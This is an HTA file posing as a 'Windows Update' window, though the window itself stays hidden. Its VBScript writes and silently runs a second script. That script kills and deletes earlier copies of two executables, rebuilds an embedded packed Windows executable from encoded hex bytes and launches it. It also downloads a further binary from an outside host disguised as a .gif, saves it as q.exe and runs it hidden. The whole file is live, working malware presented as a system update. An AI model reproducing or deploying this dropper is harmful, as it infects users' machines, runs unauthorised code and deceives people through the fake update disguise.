<HTML>
<HEAD>
<TITLE>Windows Update</TITLE>
<HTA:APPLICATION ID="Q" APPLICATIONNAME="Q" BORDER="none" BORDERSTYLE="normal" CAPTION="no" ICON="" CONTEXTMENU="no" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" SHOWINTASKBAR="no" SINGLEINSTANCE="no" SYSMENU="no" VERSION="1.0" WINDOWSTATE="minimize"/>
<SCRIPT LANGUAGE="VBScript">
MyFile = "q.vbs"
Set FSO = CreateObject("Scripting.FileSystemObject")
Set TSO = FSO.CreateTextFile(MyFile, True)
TSO.write "strComputer = "".""" & vbcrlf
TSO.write "Set objWMIService = GetObject(""winmgmts:"" _" & vbcrlf
TSO.write "    & ""{impersonationLevel=impersonate}!\\"" & strComputer & ""\root\cimv2"")" & vbcrlf
TSO.write "Set colProcessList = objWMIService.ExecQuery _ " & vbcrlf
TSO.write "    (""SELECT * FROM Win32_Process WHERE Name = 'x.exe'"")" & vbcrlf
TSO.write "For Each objProcess in colProcessList" & vbcrlf
TSO.write "    objProcess.Terminate()" & vbcrlf
TSO.write "Next" & vbcrlf
TSO.write "strComputer = "".""" & vbcrlf
TSO.write "Set objWMIService = GetObject(""winmgmts:"" _" & vbcrlf
TSO.write "    & ""{impersonationLevel=impersonate}!\\"" & strComputer & ""\root\cimv2"")" & vbcrlf
TSO.write "Set colProcessList = objWMIService.ExecQuery _ " & vbcrlf
TSO.write "    (""SELECT * FROM Win32_Process WHERE Name = 'q.exe'"")" & vbcrlf
TSO.write "For Each objProcess in colProcessList" & vbcrlf
TSO.write "    objProcess.Terminate()" & vbcrlf
TSO.write "Next" & vbcrlf
TSO.write "WScript.Sleep(2000)" & vbcrlf
TSO.write "Set objFileSys = CreateObject(""Scripting.FileSystemObject"")" & vbcrlf
TSO.write "IF objFileSys.FileExists(""x.exe"") Then" & vbcrlf
TSO.write "        objFileSys.DeleteFile ""x.exe""" & vbcrlf
TSO.write "End IF" & vbcrlf
TSO.write "Set objFileSys = CreateObject(""Scripting.FileSystemObject"")" & vbcrlf
TSO.write "IF objFileSys.FileExists(""q.exe"") Then" & vbcrlf
TSO.write "        objFileSys.DeleteFile ""q.exe""" & vbcrlf
TSO.write "End IF" & vbcrlf
TSO.write "t=""4D,5A,90,00,03,003,04,003,50,45,002,4C,01,02,00,46,53,47,21,008,E0,00,0F,01,0B,01,003,04,003,16,006,0B,59,003,10,002,0C,005,40,002,10,003,02,002,04,007,04,008,60,003,02,006,02,005,10,002,10,004,10,002,10""" & vbcrlf
TSO.write "t=t&"",006,10,00B,D0,59,002,34,0077,74,004,40,003,10,0016,E0,002,C0,004,74,61,003,10,003,50,002,04,0A,003,02,00E,E0,002,C0,4B,45,52,4E,45,4C,33,32,2E,64,6C2,003,4C,6F,61,64,4C,69,62,72,61,72,79,41,002,47,65""" & vbcrlf
TSO.write "t=t&"",74,50,72,6F,63,41,642,72,65,732,0019,C6,59,40,00,BA,59,40,00,BC,59,40,00,98,01,40,002,10,40,002,50,40,00,01,20,40,00,01,30,40,005,D4,21,40,00,01,003,F8,59,40,0039,68,E0,01,E1,C3,A8,FC,3F,40""" & vbcrlf
TSO.write "t=t&"",E0,E8,50,D9,0A,DB,41,3E,08,0F,F4,84,42,DD,C8,E5,48,2D,99,F8,29,6A,91,22,98,77,A4,1D,88,13,E8,7B,AA,1D,07,0F,06,05,02,0A,1B,90,3D,37,14,01,80,E8,BA,95,37,50,2B,3D,6A,64,33,BE,45,FF""" & vbcrlf
TSO.write "t=t&"",35,06,2B,E8,A6,34,8C,0B,44,8F,68,50,6C,4A,43,84,67,79,15,50,BF,F8,17,85,C0,28,74,08,38,0C,FF,D0,EB,24,7D,37,88,E8,50,A4,7E,50,58,0C,44,8C,42,49,22,382,8D,35,302,16,AC,84,C0,0E,75,FB""" & vbcrlf
TSO.write "t=t&"",8A,06,D8,7B,56,E8,6E,0E,2C,03,EB,ED,68,EB,1C,7C,0E,6F,09,47,80,96,55,8B,EC,81,0E,C4,D4,FD,FF,21,C7,85,D8,FE,95,0C,28,44,72,18,02,E8,BB,55,A3,68,C1,97,8B,7D,08,8D,52,1B,50,85,A0,68""" & vbcrlf
TSO.write "t=t&"",0E,5B,C5,11,28,85,33,65,50,0E,FC,05,19,E8,56,28,13,57,FA,C9,D0,1B,AB,1F,75,1E,4D,B5,E0,3B,84,9B,01,E8,8C,5E,6A,C6,50,9C,08,64,A3,E2,46,5F,54,8A,77,34,82,74,02,EB,A6,99,11,30,10,C9""" & vbcrlf
TSO.write "t=t&"",C2,04,E1,50,9F,56,57,53,76,50,3C,75,08,8E,DE,AC,3C,14,C4,74,7B,5C,62,F7,16,EB,F3,87,97,0C,7E,A6,AC,AA,26,FE,FA,0C,58,5B,5F,5E,58,08,90,18,0D,25,48,20,40,0D,D2,19,24,0C,10,86,43,14""" & vbcrlf
TSO.write "t=t&"",21,18,90,1C,DE,E1,90,44,C8,28,64,2C,32,30,19,34,0C,38,86,43,3C,21,08,B8,43,20,04,C0,002,AF,01,7F,E0,75,73,65,72,07,33,32,2E,64,6C,1C,002,07,5F,41,56,50,43,11,2E,45,58,CA,A5,0B,4D,5E""" & vbcrlf
TSO.write "t=t&"",0A,5F,47,87,4E,54,53,E5,52,21,0D,4C,4F,FF,E7,9F2,A3,31,30,49,2D,CF,E9,4F,4A,A3,12,10,9C,56,85,52,55,53,64,0E,30,09,50,49,4D,7D,4F,E9,FB,A5,37,43,F7,4C,C7,43,52,33,32,33,EB,56,B0,44""" & vbcrlf
TSO.write "t=t&"",57,49,A6,40,15,54,43,4F,0A,87,47,55,E2,52,44,9B,0C,38,C4,35,FA,AC,19,1B,55,50,44,0A,F5,37,4B,E6,57,69,52,48,0C,42,19,43,0C,68,DA,0F,71,56,9C,B1,53,D4,4C,0D,D0,C1,CA,39,0D,65,50,64""" & vbcrlf
TSO.write "t=t&"",08,29,91,4B,02,53,01,9E,47,53,59,4E,B4,47,60,42,44,5F,502,90,46,F6,53,E2,49,CA,A8,41,53,47,42,B7,44,75,46,64,0A,11,5D,9F,DB,1C,72,98,A5,0A,3C,B6,56,60,3C,82,C1,33,13,E5,30,09,4C,41""" & vbcrlf
TSO.write "t=t&"",43,29,4B,44,0B,4A,1D,23,B6,3E,B8,4F,D4,DF,52,53,4E,0D,79,56,47,A1,7A,3C,53,31,A1,30,8A,43,44,41,4F,04,46,47,82,42,5A,9B,0B,C8,41,44,4D,FA,4E,AE,0D,7E,55,90,78,8C,0D,78,4E,A7,0B,23""" & vbcrlf
TSO.write "t=t&"",F0,BE,BD,4C,BF,41,52,0A,90,BA,43,0C,8A,33,0D,52,08,C0,0C,4A,08,B4,A6,65,32,42,D7,30,31,36,92,0C,88,6F,8D,57,D0,46,39,EF,21,26,1D,0D,21,8A,1D,0D,26,BA,77,07,57,4E,42,31,38,2A,0C,C4""" & vbcrlf
TSO.write "t=t&"",54,C6,83,7C,8A,0D,A9,C9,1C,53,C9,1A,50,85,49,59,26,0B,8A,8C,08,A7,C3,3E,B7,52,59,F2,4F,4E,B3,0D,BA,42,BB,C8,F2,4E,B2,DD,42,26,43,E9,D8,48,39,35,A5,0D,A1,1A,C4,56,29,D2,C5,3A,89,2D""" & vbcrlf
TSO.write "t=t&"",43,14,19,3E,46,41,D3,09,6F,30,D9,D0,4C,36,6B,7D,B0,80,F9,35,80,20,D9,43,B1,4F,47,46,F5,2D,93,40,5F,FF,EE,AA,41,23,68,89,21,08,13,53,11,B9,09,C3,35,33,30,1C,9E,42,59,A9,11,C4,57,6D""" & vbcrlf
TSO.write "t=t&"",1C,8C,47,28,42,4D,BE,53,55,0B,14,50,4F,77,D3,39,8E,17,0A,BB,88,05,0D,93,48,5B,AF,F2,7C,0A,E9,23,15,8F,48,2A,4C,1E,C8,AA,24,CA,C8,9A,1C,4D,BD,FC,A5,0B,6B,16,4A,90,F4,D2,6A,10,2C,83""" & vbcrlf
TSO.write "t=t&"",42,0D,C4,4E,54,75,50,D8,0A,CD,53,C6,C7,42,48,0D,D1,24,94,B4,51,E0,A1,02,0C,14,50,A0,24,4D,1B,EF,9E,BF,5D,82,8D,4A,D6,C6,6E,4D,51,4B,EA,61,7F,41,3F,34,30,42,E6,47,B1,11,50,54,C0,2D""" & vbcrlf
TSO.write "t=t&"",11,A6,1C,DB,12,2D,1C,E8,C7,32,31,33,7D,2A,49,5E,0B,18,7E,EA,4C,E8,34,D0,34,19,B8,50,85,6F,12,15,3F,AD,2E,43,2D,A9,20,A4,9E,24,72,C3,4C,44,DE,2C,84,0A,D4,3A,B6,52,F2,9A,1B,C2,08,8F""" & vbcrlf
TSO.write "t=t&"",DF,F4,0D,F4,2D,D9,63,3B,DE,FC,34,41,B2,67,0A,CA,09,6B,05,E3,4D,CF,7B,68,20,84,26,6D,E6,4D,C6,B8,C2,8C,0C,B9,17,CF,B2,5A,37,322,0B,29,FF,81,62,30,32,44,D6,92,6F,63,5B,42,84,09,6A,93""" & vbcrlf
TSO.write "t=t&"",D2,53,E7,8F,3E,FF,A9,56,3E,8D,52,46,CA,E2,91,0B,53,93,FA,4E,10,A7,24,DF,77,62,CF,F6,76,09,1A,FD,CF,46,E8,0D,1E,55,30,9C,31,64,DA,22,0D,48,4E,77,3F,38,CC,3C,2B,59,0D,24,16,1A,57,4E""" & vbcrlf
TSO.write "t=t&"",31,0D,44,DE,B2,0A,40,B5,55,42,AC,0C,8E,21,48,43,15,B6,16,D9,DA,46,34,49,0C,21,97,19,21,FD,4F,2C,71,F5,52,60,39,14,A1,1B,A0,23,0C,24,5D,53,4C,17,92,94,98,47,1A,7F,F8,59,3C,48,55,4B""" & vbcrlf
TSO.write "t=t&"",09,6A,2D,05,B5,32,76,15,94,AC,49,DE,BC,E6,BD,5B,14,19,55,4D,0A,92,15,DD,FB,DE,B6,DE,FE,98,96,FD,46,41,71,F3,A8,5A,7A,FD,25,60,E6,61,68,37,49,212,61,A6,16,B6,1C,57,CE,39,38,DB,4A,CC""" & vbcrlf
TSO.write "t=t&"",C7,9F,C2,32,4B,B3,19,6A,1A,BB,8F,2B,CB,BC,D9,F0,D0,0D,90,A6,3E,48,52,E8,C9,54,08,2A,79,6A,40,1A,52,32,CE,FE,FA,57,91,15,EF,9E,64,B4,A1,19,BD,6D,2C,96,22,6E,9F,6E,DB,1F,50,54,53,0C""" & vbcrlf
TSO.write "t=t&"",F4,12,37,50,5A,13,E6,F9,87,16,3F,CA,2D,D1,A0,16,F8,EE,4B,A6,0B,6F,56,51,B2,67,CC,D4,43,89,9F,CC,53,39,D1,08,10,C1,4B,5F,37,36,CC,31,34,75,33,AC,12,98,30,A5,79,32,1A,44,67,D9,32,1A""" & vbcrlf
TSO.write "t=t&"",46,E4,EA,77,49,D0,3A,10,ED,EF,99,31,30,CB,99,37,5F,D6,32,1C,3C,9A,86,92,88,D1,0E2,9F,74,78,27,0B,8A,89,ED,98,0F,BE,64,10,47,94,F1,33,0D,4C,CA,54,B1,18,4F2,CA,68,18,23,52,A7,D0,44,99""" & vbcrlf
TSO.write "t=t&"",12,87,65,00,1A,50,87,69,4D,54,4D,0D,E0,42,43,A6,0A,92,B4,57,4F,93,4C,FC,9E,36,BC,78,92,2B,90,46,56,30,15,41,4D,19,0C,04,53,99,EE,A5,DA,33,64,C8,55,52,47,A6,64,3F,56,49,AE,57,F2,E4""" & vbcrlf
TSO.write "t=t&"",51,F3,C4,42,19,7D,B1,EB,EF,36,55,4A,F2,48,14,58,C1,A6,DC,D0,7E,98,68,20,0D,52,CE,0A,D0,18,D0,3F,55,52,0B,D1,24,9F,A5,16,E0,A2,37,42,60,BA,ED,08,A5,CB,0A,43,4E,7F,6F,A9,55,0E,25,7F""" & vbcrlf
TSO.write "t=t&"",67,31,19,53,ED,46,47,98,94,42,37,CE,F6,2D,09,EE,92,43,99,94,5F,2D,AA,A7,E2,55,53,94,1B,90,AC,90,E1,FB,D6,5B,AE,28,A6,432,78,90,8F,D3,16,29,E2,F6,9A,67,12,8B,6A,88,4D,82,35,28,65,91""" & vbcrlf
TSO.write "t=t&"",84,58,32,38,4F,E2,79,12,09,BB,3E,37,10,48,60,8A,0B,67,59,9A,0A,6F,69,33,16,06,D0,98,65,D0,8A,2C,46,10,15,4C,0C,94,95,90,C9,23,35,09,59,4D,9B,07,C2,56,9B,65,47,14,3F,41,8A,F9,4B,32""" & vbcrlf
TSO.write "t=t&"",BD,99,18,55,4B,0B,48,2D,B7,CF,34,07,CA,41,08,64,4D,64,81,AE,32,2D,61,EF,0A,0C,3B,4E,42,9E,D4,33,0A,81,46,41,4B,35,18,47,39,42,4F,46,69,F0,AE,6A,54,0C,E7,A5,50,24,0E,B2,7A,43,44,7C""" & vbcrlf
TSO.write "t=t&"",52,4A,7F,9A,18,67,17,2D,9B,9F,7F,57,A4,63,A1,C4,44,B9,B2,73,A4,36,94,0D,71,56,31,C0,2C,8F,B6,1B,92,6D,86,0B,81,D8,54,4D,0A,24,66,39,F3,4A,0C,69,AC,B2,61,88,25,6F,53,E2,46,96,0C,9C""" & vbcrlf
TSO.write "t=t&"",D1,8B,4D,44,12,8B,DA,2B,9C,C8,D0,56,4E,F3,EE,62,B3,EC,C6,D3,1A2,D9,18,33,0D,14,18,34,32,0A,D2,4A,11,30,87,EF,95,C3,4D,97,92,53,95,82,A2,36,59,AC,CD,24,DA,58,FE,53,52,0C,2C,48,0D,48""" & vbcrlf
TSO.write "t=t&"",42,6F,BE,E9,8F,EF,B2,8A,9E,65,17,4F,65,0A,CA,D3,68,16,E0,6F,74,0D,A5,E1,C1,0B,0E,45,C8,0D,0F,24,A7,44,C4,84,38,39,37,D9,3A,13,D1,37,27,BA,19,6A,1D,92,8F,19,1A,47,61,2E,37,46,7B,15""" & vbcrlf
TSO.write "t=t&"",48,4F,53,29,59,7F,3F,4D,D3,13,F6,16,7A,52,B9,F4,4F,B3,77,26,85,52,CE,BE,64,18,43,CA,BA,7B,B0,80,48,47,C4,A7,C5,59,D3,14,4E,B4,C1,C9,4B,53,26,6D,DC,E5,04,03,30,E7,EB,1F,5A,41,A6,13""" & vbcrlf
TSO.write "t=t&"",23,0A,29,1E,AA,7B,53,31,11,69,1C,6E,35,D3,18,82,42,53,33,E4,88,BF,4D,2B,32,36,27,37,1E,7D,20,C9,52,36,D6,70,9C,18,97,20,27,F4,59,C4,C7,9A,34,85,12,2F,92,4E,14,0F,B9,96,B8,50,01,6B""" & vbcrlf
TSO.write "t=t&"",1C,65,72,6E,D2,6C,4E,A8,64,BD,AE,5D,3E,86,67,69,73,74,24,67,53,06,76,97,63,D7,50,96,6F,0A,71,73,B1,DC,2F,A1,02,45,5C,4D,B3,2A,26,73,91,66,74,EB,FF,A3,6E,64,D3,77,DF,81,43,75,72,C5""" & vbcrlf
TSO.write "t=t&"",65,EC,74,56,DF,62,0F,69,6F,1F,DF,52,FE,70,7C,4D,7A,6D,FC,79,1E,20,43,68,0E,63,6B,15,01,E2,5C,8C,1F,36,6B,76,2E,782,C0,00,01,1C,10,20,40,03,6B,65,72,6E,98,6C,33,32,3A,2E,64,F6,E0,49""" & vbcrlf
TSO.write "t=t&"",FA,74,3C,4D,6F,BF,75,F7,30,46,69,08,4E,61,6D,FE,41,A5,13,1F,48,DA,6E,46,10,11,50,72,3C,6F,63,FD2,DB,F3,73,8D,06,0F,57,69,34,3E,6F,77,3B,44,E7,22,63,DF,3D,58,79,48,51,70,F4,6E,A2,25""" & vbcrlf
TSO.write "t=t&"",06,21,45,2C,3F,61,74,BE,54,FE,33,6C,68,D0,70,1F,D2,53,6E,FB,3D,73,FF,70,74,522,21,67,24,4E,66,78,1C,6F,55,B8,AE,70,0A,56,8E,1B,6D,9C,46,61,3E,31,59,1C,45,78,B8,AE,76,F8,74,76,72,CA""" & vbcrlf
TSO.write "t=t&"",30,41,09,41,6D,70,69,8E,14,45,6F,CA,79,A8,4F,54,4A,A6,1E,F5,B3,3E,32,6C,FF,DA,AF,EE,0E,01,15,E4,7B,F4,76,CA,E8,69,E4,E0,54,65,67,4F,A9,9F,4B,DD,79,94,B2,41,0E,28,53,C2,0F,56,61,6C""" & vbcrlf
TSO.write "t=t&"",75,34,0F,CA,43,3E,37,3D,06,02,00,BE,A4,01,40,00,AD,93,AD,97,AD,56,96,B2,80,A4,B6,80,FF,13,73,F9,33,C9,FF,13,73,16,33,C0,FF,13,73,1F,B6,80,41,B0,10,FF,13,12,C0,73,FA,75,3C,AA,EB,E0""" & vbcrlf
TSO.write "t=t&"",FF,53,08,02,F6,83,D9,01,75,0E,FF,53,04,EB,26,AC,D1,E8,74,2F,13,C9,EB,1A,91,48,C1,E0,08,AC,FF,53,04,3D,00,7D,002,73,0A,80,FC,05,73,06,83,F8,7F,77,02,412,95,8B,C5,B6,00,56,8B,F7,2B,F0""" & vbcrlf
TSO.write "t=t&"",F3,A4,5E,EB,9D,8B,D6,5E,AD,48,74,0A,79,02,AD,50,56,8B,F2,97,EB,87,AD,93,5E,46,AD,97,56,FF,13,95,AC,84,C0,75,FB,FE,0E,74,F0,79,05,46,AD,50,EB,09,FE,0E,0F,84,4E,B6,FF2,56,55,FF,53,04""" & vbcrlf
TSO.write "t=t&"",AB,EB,E0,33,C9,41,FF,132,C9,FF,13,72,F8,C3,02,D2,75,05,8A,16,46,12,D2,C3,F8,59,00A,54,01,002,F8,59,0016,61,01,002,6F,01,0012""" & vbcrlf
TSO.write "tmp = Split(t, "","")" & vbcrlf
TSO.write "Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbcrlf
TSO.write "pth = ""x.exe""" & vbcrlf
TSO.write "Set f = fso.CreateTextFile(pth, ForWriting)" & vbcrlf
TSO.write "For i = 0 To UBound(tmp)" & vbcrlf
TSO.write "     l = Len(tmp(i))" & vbcrlf
TSO.write "     b = Int(""&H"" & Left(tmp(i), 2))" & vbcrlf
TSO.write "     If l > 2 Then" & vbcrlf
TSO.write "             r = Int(""&H"" & Mid(tmp(i), 3, l))" & vbcrlf
TSO.write "             For j = 1 To r" & vbcrlf
TSO.write "             f.Write Chr(b)" & vbcrlf
TSO.write "             Next" & vbcrlf
TSO.write "     Else" & vbcrlf
TSO.write "             f.Write Chr(b)" & vbcrlf
TSO.write "     End If" & vbcrlf
TSO.write "Next" & vbcrlf
TSO.write "f.Close" & vbcrlf
TSO.write "WScript.CreateObject(""WScript.Shell"").run(pth)" & vbcrlf
TSO.write "Dim BD" & vbcrlf
TSO.write "Dim xml" & vbcrlf
TSO.write "WScript.Sleep(8000)" & vbcrlf
TSO.write "Set xml = CreateObject(""Microsoft.XMLHTTP"")" & vbcrlf
TSO.write "xml.Open ""GET"", ""http://sextop.ws/rgghost.gif"", False" & vbcrlf
TSO.write "xml.Send" & vbcrlf
TSO.write "BD = xml.ResponseBody" & vbcrlf
TSO.write "Const adTypeBinary = 1" & vbcrlf
TSO.write "Const adSaveCreateOverWrite = 2" & vbcrlf
TSO.write "Dim BinaryStream" & vbcrlf
TSO.write "Set BinaryStream = CreateObject(""ADODB.Stream"")" & vbcrlf
TSO.write "BinaryStream.Type = adTypeBinary" & vbcrlf
TSO.write "a=a" & vbcrlf
TSO.write "C=C=C" & vbcrlf
TSO.write "BinaryStream.Open" & vbcrlf
TSO.write "BinaryStream.Write BD" & vbcrlf
TSO.write "BinaryStream.SaveToFile ""q.exe"", adSaveCreateOverWrite" & vbcrlf
TSO.write "C=C=C" & vbcrlf
TSO.write "Dim WshShell" & vbcrlf
TSO.write "Set WshShell = CreateObject(""WScript.Shell"")" & vbcrlf
TSO.write "WshShell.Run ""q.exe"", 0, false" & vbcrlf
TSO.close
Set TSO = Nothing
Set FSO = Nothing
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "q.vbs", 0, false
</SCRIPT>
<script>window.close()</script>
</HEAD>
</html>
